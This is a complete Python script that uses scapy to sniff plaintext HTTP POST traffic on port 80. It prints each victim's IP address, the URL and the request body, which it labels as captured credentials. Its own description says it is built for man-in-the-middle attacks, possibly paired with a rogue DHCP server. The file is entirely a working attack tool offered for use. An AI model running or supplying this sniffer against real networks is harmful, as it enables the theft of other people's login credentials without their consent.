#!/bin/python3
import argparse
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import IP
from scapy.packet import Raw
from scapy.sendrecv import sniff


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def credentialsSniffing(packet):
    try:
        if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == "POST":
            url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
            ipVictim = packet[IP].src
            try:
                credentials = packet[Raw].load.decode("utf-8")
            except:
                #credentials = packet[Raw].load
                pass

            print(f'{bcolors.OKBLUE}---New HTTP POST---{bcolors.ENDC}')
            print(f"{bcolors.FAIL}[*]{bcolors.ENDC} From: {ipVictim} {bcolors.WARNING}{credentials} {bcolors.ENDC}{bcolors.UNDERLINE}{url}{bcolors.ENDC}")
    except:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="This script is a plain text credentials sniffer. It will show you HTTP POST. "
                                                 "It is developed to be used in man in the middle attacks (maybe with a dhcp server?). "
                                                 "If you are using it with a dhcp server, you need to enable forwarding.")
    print("Sniffing HTTP credentials...")
    sniff(filter="tcp and (port 80)", prn=credentialsSniffing)
